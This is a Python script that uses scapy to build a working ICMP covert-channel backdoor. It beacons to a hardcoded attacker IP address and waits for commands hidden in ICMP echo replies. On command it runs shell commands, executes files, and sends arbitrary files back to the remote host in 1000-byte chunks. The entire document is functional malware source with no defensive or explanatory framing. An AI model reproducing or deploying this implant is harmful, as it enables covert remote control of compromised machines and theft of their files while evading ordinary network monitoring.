from scapy.all import sr1,IP,ICMP,Raw,sniff,sr, send
from multiprocessing import Process
import os

attacker_ip = "16.170.247.1"
TTL = 64


def beaconing():
	icmp_packet = (IP(dst=attacker_ip, ttl=TTL)/ICMP(type=8)/Raw(load="Beacon from zombie"))
	send(icmp_packet, verbose=0)
	print("Beacon!")

def sniffer():
	print("Start Sniffing")
	sniff(iface="enp1s0", prn=cmd, filter="icmp",store="0")

def cmd(response):
	if response[IP].src==attacker_ip and response[ICMP].type == 0:
		parse_command(response)

def parse_command(response):
	command = response[Raw].load.decode('utf-8')
	if command.startswith("ls"):
		ls_output = os.popen(command).read()
		icmp_packet = (IP(dst=attacker_ip, ttl=TTL)/ICMP(type=8)/Raw(load=(ls_output)))
		send(icmp_packet, verbose=0)
		beaconing()

	elif command.startswith("run"):
		final_command = "./" + command[4:]
		os.system(final_command)
		beaconing()

	elif command.startswith("send"):
		file_to_open = command[5:]
		with open(file_to_open, "rb") as file:
			output = file.read()
			chunks = []
			length = len(output)
			num_of_chunks = length // 1000
			left_overs = length - num_of_chunks * 1000

			for i in range(num_of_chunks):
				chunk = output[i * 1000: (i + 1) * 1000]
				chunks.append(chunk)
				
			if left_overs > 0:
				last_chunk = output[num_of_chunks * 1000:]
				chunks.append(last_chunk)

			for chunk in chunks:
				icmp_packet = (IP(dst=attacker_ip, ttl = TTL)/ICMP(type=8)/Raw(load=chunk))
				send(icmp_packet, verbose=0)

		icmp_packet = (IP(dst=attacker_ip, ttl = TTL)/ICMP(type=8)/Raw(load="done"))
		send(icmp_packet, verbose=0)
		beaconing()



def main():
	beaconing()
	sniffer()

if __name__ == "__main__":
	main()
